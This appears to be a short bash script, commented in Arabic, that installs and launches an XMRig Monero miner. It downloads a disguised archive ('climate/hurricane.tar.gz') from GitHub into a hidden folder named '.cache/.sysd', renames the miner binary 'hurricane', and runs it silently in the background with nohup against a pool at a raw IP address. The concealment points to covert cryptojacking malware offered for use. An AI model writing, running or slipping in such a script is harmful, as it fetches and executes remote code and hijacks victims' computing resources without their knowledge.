#!/bin/bash

# إعداد بيانات المحفظة والمعدّن
WALLET="88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
WORKER="science1"
POOL="45.155.102.89:443"
THREADS=8
# مجلد العمل
WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل النسخة الجاهزة من XMRig (Linux x64)
wget https://raw.githubusercontent.com/jaydmarks227/climate/refs/heads/main/hurricane.tar.gz -O hurricane.tar.gz

# فك الضغط
tar -xvf hurricane.tar.gz --strip=1
rm hurricane.tar.gz

# تشغيل المعدّن في الخلفية باستخدام nohup
nohup ./hurricane -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
